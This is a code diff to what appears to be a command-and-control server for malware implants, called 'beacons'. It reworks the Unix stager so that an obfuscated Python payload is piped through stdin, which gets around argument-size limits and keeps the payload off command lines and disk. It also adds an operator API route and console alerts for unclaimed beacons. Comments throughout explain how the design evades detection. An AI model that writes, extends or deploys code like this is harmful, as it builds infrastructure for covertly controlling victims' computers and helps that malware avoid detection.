@@ -606,9 +606,12 @@ def _obfuscate_layer(code: str, var_mod: str) -> str:
     The emitted line binds the decompressed text to the module global
     `_src` before executing it, instead of handing it straight to `exec`.
     That is what lets a running artifact start a second mode of itself:
-    under `python3 -c` there is no file to re-run and `sys.argv[0]` is the
-    literal string "-c", so the only copy of the source is the one the
-    process is holding. `Beacon._exec_tunnel` writes it to a
+    under `printf %s "<stage>" | python3 -` there is no file to re-run and
+    `sys.argv[0]` is the literal string "-" (the Windows one-liner's
+    `python -c` gives "-c"), so the only copy of the source is the one
+    the process is holding. The payload travels on stdin rather than as
+    a `-c` argument because Linux refuses an argv entry over 131072
+    bytes. `Beacon._exec_tunnel` writes it to a
     `python3 -` child on stdin, which keeps the payload off the child's
     command line and off the disk.
 
@@ -941,6 +944,11 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             agent_list.append({**info, "status": status,
                                "caps": info.get("caps") or []})
         return jsonify(agent_list)
+
+    @app.route("/api/rescues/unattributed", methods=["GET"])
+    @require_auth
+    def api_rescues_unattributed():
+        return jsonify({"unattributed": list(reversed(unattributed_rescues))})
 
     @app.route("/api/agents/<agent_id>", methods=["GET"])
     @require_auth
@@ -1906,13 +1914,21 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             })
 
         # Double quotes on both, with single quotes inside the stage
-        # itself: one text that `sh -c`, `cmd.exe` and PowerShell's
-        # `Invoke-Expression` all hand to `-c` as a single argument. The
-        # stage carries no `$`, backtick, backslash or `"`, which is what
-        # makes the double-quoted form safe in all three. See
+        # itself. The stage carries no `$`, backtick, backslash or `"`,
+        # which is what makes the double-quoted form safe in `sh`,
+        # `cmd.exe` and PowerShell's `Invoke-Expression` alike. See
         # `_obfuscate_layer`, and `docs/TUNNEL.md` for why the inline
         # Windows one-liner is undeliverable at this size regardless.
-        oneliner_unix = f'python3 -c "{stage}"'
+        #
+        # The two differ in where the payload goes. Linux refuses any
+        # single argv entry over 131072 bytes (MAX_ARG_STRLEN) and the
+        # stage is larger, so `python3 -c "<stage>"` cannot be exec'd
+        # there. Unix therefore pipes it into python's stdin, through
+        # `printf`, which dash, bash and busybox ash all run as a builtin
+        # so nothing execs the payload; `%s` keeps it out of the format
+        # string. Windows keeps `-c`: its one-liner is only ever run
+        # through `Invoke-Expression`, which has no such limit.
+        oneliner_unix = f'printf %s "{stage}" | python3 -'
         oneliner_win = f'python -c "{stage}"'
         stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
                                      oneliner_win)
@@ -2967,6 +2983,10 @@ def _handle_rescue(payload: dict, crypto: ServerCrypto):
             info["last_channel"] = "dns"
             return _handle_beacon({"agent_id": agent_id}, crypto)
 
+    # No agent id here: the record carries a fingerprint and leg codes,
+    # never a string from the target, so the summary is safe to log whole.
+    _log_event("RESCUE", "A stuck beacon nobody can claim (fingerprint "
+               "%04x) says: %s" % (record["fingerprint"], stuck["summary"]))
     unattributed_rescues.append(stuck)
     del unattributed_rescues[:-_RESCUE_UNATTRIBUTED_MAX]
     return _fake_response()
@@ -9380,10 +9400,39 @@ function copyToClipboard(text, label){
   });
 }
 
+// A rescue no beacon can claim is told once, not every tick: the server
+// keeps the last 50 and never clears them, so each is keyed on who sent it
+// and when. Several found in one poll -- a console opened on a server that
+// has been up for a week, or a burst -- are one notification that counts
+// them; the Server Log has each.
+let seenRescues = {};
+async function refreshRescues(){
+  if(!storedToken()) return;
+  const r = await api("/api/rescues/unattributed");
+  // Served newest first; announced oldest first, so the newest ends on top.
+  const fresh = (r.unattributed || []).slice().reverse().filter(rec => {
+    const key = rec.fingerprint+"@"+rec.at;
+    if(seenRescues[key]) return false;
+    seenRescues[key] = true;
+    return true;
+  });
+  if(fresh.length > 1){
+    toast("warning", fresh.length+" Unknown Beacons Are Stuck",
+      fresh.length+" stuck beacons match no agent<br>Each is in the Server Log", 10000);
+  } else if(fresh.length === 1){
+    const rec = fresh[0];
+    const fp = ("0000"+(rec.fingerprint|0).toString(16)).slice(-4);
+    toast("warning", "Unknown Beacon Is Stuck",
+      "fingerprint "+esc(fp)+" matches no agent<br>"+esc(rec.summary), 10000);
+  }
+}
+
 if(storedToken()){
   setInterval(refreshAgents, 3000);
+  setInterval(refreshRescues, 3000);
   setInterval(checkTaskResults, 2500);
   refreshAgents();
+  refreshRescues();
   toast("info","Server Online","Listening for beacon connections<br>Beacon traffic accepted on any POST path",6000);
 } else {
   askForToken(false);
